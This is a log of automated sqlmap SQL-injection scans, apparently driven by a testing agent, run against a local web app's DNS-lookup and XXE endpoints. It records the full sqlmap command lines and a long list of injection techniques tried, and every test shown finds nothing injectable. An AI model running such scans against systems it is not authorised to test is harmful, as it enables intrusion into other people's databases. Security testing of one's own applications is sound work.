2025-09-26 18:53:23,055 - INFO - [18:53:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 18:53:23,702 - INFO - [18:53:23] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:53:24,287 - INFO - [18:53:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:53:25,059 - INFO - [18:53:25] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:53:25,493 - INFO - [18:53:25] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 18:53:26,150 - INFO - [18:53:26] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:53:26,527 - INFO - [18:53:26] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 18:53:27,268 - INFO - [18:53:27] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:53:27,672 - INFO - [18:53:27] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 18:53:28,796 - INFO - [18:53:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:28,821 - INFO - [18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 18:53:28,840 - INFO - [18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 18:53:28,866 - INFO - [18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 18:53:28,876 - INFO - [18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 18:53:28,899 - INFO - [18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 18:53:28,911 - INFO - [18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 18:53:28,926 - INFO - [18:53:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 18:53:28,945 - INFO - [18:53:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:28,963 - INFO - [18:53:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 18:53:28,977 - INFO - [18:53:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 18:53:29,000 - INFO - [18:53:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 18:53:29,019 - INFO - [18:53:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:29,035 - INFO - [18:53:29] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
2025-09-26 18:53:29,054 - INFO - [18:53:29] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:29,072 - INFO - [18:53:29] [INFO] testing 'Informix boolean-based blind - Parameter replace'
2025-09-26 18:53:29,090 - INFO - [18:53:29] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:29,109 - INFO - [18:53:29] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
2025-09-26 18:53:29,124 - INFO - [18:53:29] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:29,139 - INFO - [18:53:29] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 18:53:29,160 - INFO - [18:53:29] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 18:53:29,173 - INFO - [18:53:29] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 18:53:29,192 - INFO - [18:53:29] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 18:53:29,210 - INFO - [18:53:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:29,237 - INFO - [18:53:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:29,270 - INFO - [18:53:29] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:29,283 - INFO - [18:53:29] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:29,300 - INFO - [18:53:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:29,323 - INFO - [18:53:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:53:29,370 - INFO - [18:53:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
2025-09-26 18:53:29,415 - INFO - [18:53:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
2025-09-26 18:53:29,459 - INFO - [18:53:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:53:29,504 - INFO - [18:53:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:29,546 - INFO - [18:53:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:29,583 - INFO - [18:53:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:29,629 - INFO - [18:53:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:29,671 - INFO - [18:53:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
2025-09-26 18:53:29,770 - INFO - [18:53:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
2025-09-26 18:53:29,819 - INFO - [18:53:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
2025-09-26 18:53:29,885 - INFO - [18:53:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
2025-09-26 18:53:29,923 - INFO - [18:53:29] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 18:53:30,633 - INFO - [18:53:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:53:31,309 - INFO - [18:53:31] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
2025-09-26 18:53:31,333 - INFO - [18:53:31] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
2025-09-26 18:53:31,893 - INFO - [18:53:31] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
2025-09-26 18:53:32,353 - INFO - [18:53:32] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
2025-09-26 18:53:32,798 - INFO - [18:53:32] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
2025-09-26 18:53:33,148 - INFO - [18:53:33] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
2025-09-26 18:53:33,538 - INFO - [18:53:33] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
2025-09-26 18:53:33,889 - INFO - [18:53:33] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
2025-09-26 18:53:34,272 - INFO - [18:53:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:53:35,206 - INFO - [18:53:35] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 18:53:36,187 - INFO - [18:53:36] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:53:37,100 - INFO - [18:53:37] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
2025-09-26 18:53:38,023 - INFO - [18:53:38] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 18:53:38,025 - INFO - [18:53:38] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:53:38,027 - INFO - 
2025-09-26 18:53:38,028 - INFO - [*] ending @ 18:53:38 /2025-09-26/
2025-09-26 18:53:38,028 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/tools/dns-lookup?host=test' --output-dir 'attack-logs-dynamic\DNS_Lookup_sqlmap' --batch --level=5 --risk=3 --threads 5 -p host --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:52:56 /2025-09-26/

[18:52:58] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\DNS_Lookup_sqlmap' as the output directory
[18:52:58] [INFO] testing connection to the target URL
[18:52:58] [INFO] testing if the target URL content is stable
[18:52:59] [ERROR] there was an error checking the stability of page because of lack of content. Please check the page request results (and probable errors) by using higher verbosity levels
[18:52:59] [WARNING] heuristic (basic) test shows that GET parameter 'host' might not be injectable
[18:52:59] [INFO] testing for SQL injection on GET parameter 'host'
[18:52:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:52:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:53:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:53:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:53:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:53:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:53:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:53:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:53:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:53:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:53:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:53:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:53:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:53:03] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:53:04] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:53:04] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:53:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:53:05] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:53:06] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:53:06] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:53:07] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:53:07] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:53:08] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:53:08] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:53:09] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:53:09] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:53:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:53:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:53:10] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:53:10] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:53:10] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:53:10] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:53:10] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:53:10] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:53:10] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:53:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:53:10] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:53:10] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:53:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:53:11] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:11] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:11] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:11] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:11] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:11] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:53:11] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:53:11] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:53:11] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:53:11] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:53:11] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:53:12] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:53:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:53:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:53:12] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:53:13] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:53:13] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:53:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:53:14] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:53:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:53:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:53:16] [WARNING] GET parameter 'host' does not seem to be injectable
[18:53:16] [INFO] testing if parameter 'Host' is dynamic
[18:53:16] [WARNING] parameter 'Host' does not appear to be dynamic
[18:53:16] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
[18:53:16] [INFO] testing for SQL injection on parameter 'Host'
[18:53:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:53:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:53:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:53:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:53:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:53:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:53:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:53:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:53:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:53:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:53:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:53:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:53:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[18:53:20] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:53:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:53:21] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:53:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:53:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:53:23] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:53:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:53:25] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[18:53:25] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[18:53:26] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:53:26] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[18:53:27] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:53:27] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[18:53:28] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:53:28] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:53:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[18:53:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[18:53:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[18:53:28] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[18:53:28] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[18:53:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[18:53:29] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
[18:53:29] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
[18:53:29] [INFO] testing 'Informix boolean-based blind - Parameter replace'
[18:53:29] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
[18:53:29] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
[18:53:29] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
[18:53:29] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:53:29] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:53:29] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:53:29] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:53:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:29] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:29] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:29] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
[18:53:29] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
[18:53:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
[18:53:29] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
[18:53:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:29] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:29] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
[18:53:29] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:53:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
[18:53:29] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:53:29] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:53:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:53:31] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:53:31] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:53:31] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:53:32] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:53:32] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:53:33] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:53:33] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:53:33] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
[18:53:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:53:35] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:53:36] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:53:37] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:53:38] [WARNING] parameter 'Host' does not seem to be injectable
[18:53:38] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

[*] ending @ 18:53:38 /2025-09-26/

2025-09-26 18:53:38,054 - INFO - No clear injection detected during discovery for http://localhost:5000/tools/dns-lookup
2025-09-26 18:53:38,055 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/xxe --data test=1
2025-09-26 18:53:42,183 - INFO -         ___
2025-09-26 18:53:42,183 - INFO -        __H__
2025-09-26 18:53:42,183 - INFO -  ___ ___[(]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:53:42,183 - INFO - |_ -| . [(]     | .'| . |
2025-09-26 18:53:42,183 - INFO - |___|_  [']_|_|_|__,|  _|
2025-09-26 18:53:42,183 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:53:42,183 - INFO - 
2025-09-26 18:53:42,231 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:53:42,231 - INFO - 
2025-09-26 18:53:42,231 - INFO - [*] starting @ 18:53:42 /2025-09-26/
2025-09-26 18:53:42,231 - INFO - 
2025-09-26 18:53:44,892 - INFO - [18:53:44] [INFO] testing connection to the target URL
2025-09-26 18:53:44,998 - INFO - [18:53:44] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 18:53:44,998 - INFO - [18:53:44] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:53:45,024 - INFO - [18:53:45] [INFO] testing if the target URL content is stable
2025-09-26 18:53:45,398 - INFO - [18:53:45] [INFO] target URL content is stable
2025-09-26 18:53:45,409 - INFO - [18:53:45] [INFO] testing if POST parameter 'test' is dynamic
2025-09-26 18:53:45,430 - INFO - [18:53:45] [WARNING] POST parameter 'test' does not appear to be dynamic
2025-09-26 18:53:45,445 - INFO - [18:53:45] [WARNING] heuristic (basic) test shows that POST parameter 'test' might not be injectable
2025-09-26 18:53:45,461 - INFO - [18:53:45] [INFO] testing for SQL injection on POST parameter 'test'
2025-09-26 18:53:45,533 - INFO - [18:53:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:53:45,591 - INFO - [18:53:45] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:53:45,601 - INFO - [18:53:45] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:53:45,653 - INFO - [18:53:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:53:45,707 - INFO - [18:53:45] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:53:45,754 - INFO - [18:53:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:53:45,795 - INFO - [18:53:45] [INFO] testing 'Generic inline queries'
2025-09-26 18:53:45,805 - INFO - [18:53:45] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:53:45,854 - INFO - [18:53:45] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:53:45,892 - INFO - [18:53:45] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:53:45,931 - INFO - [18:53:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
